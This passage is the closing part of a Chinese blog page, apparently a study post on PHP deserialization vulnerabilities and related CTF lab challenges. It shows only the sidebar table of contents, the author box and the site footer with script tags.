class="nav-text">一句话总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%98%E5%9C%A8%E7%9A%84%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.6.</span> <span class="nav-text">反序列化存在的漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%95%B0%E7%BB%84%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">1.7.</span> <span class="nav-text">数组的反序列化</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%99%AE%E9%80%9A%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">1.8.</span> <span class="nav-text">普通对象的反序列化</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E7%B1%BB%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">1.9.</span> <span class="nav-text">自定义类的反序列化</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E6%A0%87%E8%AF%86"><span class="nav-number">1.10.</span> <span class="nav-text">其他标识</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Week7-2-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%92%8C%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E4%B8%BE%E4%BE%8B"><span class="nav-number">2.</span> <span class="nav-text">[Week7.2]魔术方法和基础漏洞举例</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="nav-number">2.1.</span> <span class="nav-text">魔术方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%B1%95%E5%BC%80%E8%AF%B4%E6%98%8E"><span class="nav-number">2.2.</span> <span class="nav-text">魔术方法展开说明</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#construct"><span class="nav-number">2.2.1.</span> <span class="nav-text">__construct()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#destruct"><span class="nav-number">2.2.2.</span> <span class="nav-text">__destruct()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#wakeup"><span class="nav-number">2.2.3.</span> <span class="nav-text">__wakeup()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sleep"><span class="nav-number">2.2.4.</span> <span class="nav-text">__sleep()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#destruct-1"><span class="nav-number">2.2.5.</span> <span class="nav-text">__destruct()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#toString-NaN"><span class="nav-number">2.2.6.</span> <span class="nav-text">__toString()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#invoke"><span class="nav-number">2.2.7.</span> <span class="nav-text">__invoke()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#call-%E5%92%8C-callStatic"><span class="nav-number">2.2.8.</span> <span class="nav-text">__call() 和 __callStatic()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B1%9E%E6%80%A7%E9%87%8D%E8%BD%BD"><span class="nav-number">2.2.9.</span> <span class="nav-text">属性重载</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E4%B8%BE%E4%BE%8B"><span class="nav-number">2.3.</span> <span class="nav-text">基础漏洞举例</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA-Level4-%E5%88%9D%E4%BD%93%E9%AA%8C"><span class="nav-number">2.3.1.</span> <span class="nav-text">*[反序列化靶场]Level4-初体验</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Week7-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">3.</span> <span class="nav-text">[Week7.3]反序列化漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#POP-%E9%93%BE%E6%9E%84%E9%80%A0"><span class="nav-number">3.1.</span> <span class="nav-text">POP 链构造</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#POP-%E9%93%BE%E6%A6%82%E8%AE%BA"><span class="nav-number">3.1.1.</span> <span class="nav-text">POP 链概论</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E5%A4%A7%E5%86%99-S-%E6%94%AF%E6%8C%81%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%BC%96%E7%A0%81"><span class="nav-number">3.1.2.</span> <span class="nav-text">使用大写 S 支持字符串编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B5%85%E6%8B%B7%E8%B4%9D"><span class="nav-number">3.1.3.</span> <span class="nav-text">浅拷贝</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%84%E9%80%A0%E4%B8%BE%E4%BE%8B"><span class="nav-number">3.1.4.</span> <span class="nav-text">构造举例</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA-Level15-POP-%E9%93%BE%E5%89%8D%E7%BD%AE"><span class="nav-number">3.1.5.</span> <span class="nav-text">*[反序列化靶场]Level15-POP 链前置</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8"><span class="nav-number">3.2.</span> <span class="nav-text">字符串逃逸</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8%E6%A6%82%E8%AE%BA"><span class="nav-number">3.2.1.</span> <span class="nav-text">字符串逃逸概论</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%87%8F%E5%B0%91%E5%BC%BA%E5%8C%96"><span class="nav-number">3.2.2.</span> <span class="nav-text">字符串减少强化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A2%9E%E5%A4%9A%E5%BC%BA%E5%8C%96"><span class="nav-number">3.2.3.</span> <span class="nav-text">字符串增多强化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQCTF-%E9%80%83"><span class="nav-number">3.2.4.</span> <span class="nav-text">*[SQCTF]逃</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Session-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">3.3.</span> <span class="nav-text">Session 反序列化</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#phar-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">3.4.</span> <span class="nav-text">phar 反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-phar"><span class="nav-number">3.4.1.</span> <span class="nav-text">什么是 phar</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Phar-%E7%BB%93%E6%9E%84"><span class="nav-number">3.4.2.</span> <span class="nav-text">Phar 结构</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phar-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-number">3.4.3.</span> <span class="nav-text">phar 漏洞原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Phar-%E4%BD%BF%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="nav-number">3.4.4.</span> <span class="nav-text">Phar 使用条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%84%E9%80%A0%E6%9C%89%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84-phar-%E6%96%87%E4%BB%B6"><span class="nav-number">3.4.5.</span> <span class="nav-text">构造有序列化的 phar 文件</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Week7-4-%E5%AE%9E%E9%AA%8C-php-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%9E%E8%B7%B5"><span class="nav-number">4.</span> <span class="nav-text">*[Week7.4]实验:php 反序列化实践</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA-Level1-4-%E7%AD%89"><span class="nav-number">4.1.</span> <span class="nav-text">[反序列化靶场]Level1-4 等</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA-Level5-%E6%99%AE%E9%80%9A%E5%80%BC%E8%A7%84%E5%88%99"><span class="nav-number">4.2.</span> <span class="nav-text">[反序列化靶场]Level5-普通值规则</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA-Level6-%E6%9D%83%E9%99%90%E4%BF%AE%E9%A5%B0%E8%A7%84%E5%88%99"><span class="nav-number">4.3.</span> <span class="nav-text">[反序列化靶场]Level6-权限修饰规则</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA-Level7-%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="nav-number">4.4.</span> <span class="nav-text">[反序列化靶场]Level7-利用方法执行命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA-Level8-GC-%E6%9C%BA%E5%88%B6%EF%BC%88UNSET-%E6%89%8B%E5%8A%A8%E9%94%80%E6%AF%81%EF%BC%89"><span class="nav-number">4.5.</span> <span class="nav-text">[反序列化靶场]Level8-GC 机制（UNSET 手动销毁）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%95%E4%B8%80"><span class="nav-number">4.5.1.</span> <span class="nav-text">法一</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%95%E4%BA%8C"><span class="nav-number">4.5.2.</span> <span class="nav-text">法二</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA-Level9-%E6%9E%90%E6%9E%84%E5%87%BD%E6%95%B0%E7%9A%84%E5%90%8E%E9%97%A8"><span class="nav-number">4.6.</span> <span class="nav-text">[反序列化靶场]Level9-析构函数的后门</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA-Level10-wakeup"><span class="nav-number">4.7.</span> <span class="nav-text">[反序列化靶场]Level10-__wakeup()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA-Level11-CVE-2016-7124-wakeup-%E6%BC%8F%E6%B4%9E"><span class="nav-number">4.8.</span> <span class="nav-text">[反序列化靶场]Level11-CVE-2016-7124(wakeup 漏洞)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA-Level12-sleep"><span class="nav-number">4.9.</span> <span class="nav-text">[反序列化靶场]Level12-__sleep()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA-Level13-toString"><span class="nav-number">4.10.</span> <span class="nav-text">[反序列化靶场]Level13-__toString()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA-Level14-invoke"><span class="nav-number">4.11.</span> <span class="nav-text">[反序列化靶场]Level14-__invoke()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA-Level16-POP-%E9%93%BE%E6%9E%84%E9%80%A0"><span class="nav-number">4.12.</span> <span class="nav-text">[反序列化靶场]Level16-POP 链构造</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA-Level17-%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8"><span class="nav-number">4.13.</span> <span class="nav-text">[反序列化靶场]Level17-字符串逃逸</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA-Level18-%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8-2"><span class="nav-number">4.14.</span> <span class="nav-text">[反序列化靶场]Level18-字符串逃逸 2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQCTF-%E9%80%83-1"><span class="nav-number">4.15.</span> <span class="nav-text">[SQCTF]逃</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MOECTF2025-%E7%AC%AC%E5%8D%81%E4%B8%83%E7%AB%A0-%E6%98%9F%E9%AA%B8%E8%BF%B7%E9%98%B5%C2%B7%E7%A5%9E%E5%BF%B5%E9%87%8D%E6%9E%84"><span class="nav-number">4.16.</span> <span class="nav-text">[MOECTF2025]第十七章 星骸迷阵·神念重构</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MOECTF2025-%E7%AC%AC%E5%8D%81%E5%85%AB%E7%AB%A0"><span class="nav-number">4.17.</span> <span class="nav-text">[MOECTF2025]第十八章</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MOECTF2025-%E7%AC%AC%E5%8D%81%E4%B9%9D%E7%AB%A0"><span class="nav-number">4.18.</span> <span class="nav-text">[MOECTF2025]第十九章</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-ez-unserialize"><span class="nav-number">4.19.</span> <span class="nav-text">[SWPUCTF 2022 新生赛]ez_ez_unserialize</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-unserialize"><span class="nav-number">4.20.</span> <span class="nav-text">[SWPUCTF 2021 新生赛]ez_unserialize</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-no-wakeup"><span class="nav-number">4.21.</span> <span class="nav-text">[SWPUCTF 2021 新生赛]no_wakeup</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-1z-unserialize"><span class="nav-number">4.22.</span> <span class="nav-text">[SWPUCTF 2022 新生赛]1z_unserialize</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SWPUCTF-2023-%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B-UnS3rialize"><span class="nav-number">4.23.</span> <span class="nav-text">[SWPUCTF 2023 秋季新生赛]UnS3rialize</span></a></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">legend1440</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">14</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
        <span class="site-state-item-count">2</span>
        <span class="site-state-item-name">分类</span>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; Sun Jan 18 2026 08:00:00 GMT+0800 (GMT+08:00) – 
  <span itemprop="copyrightYear">2026</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">legend1440</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
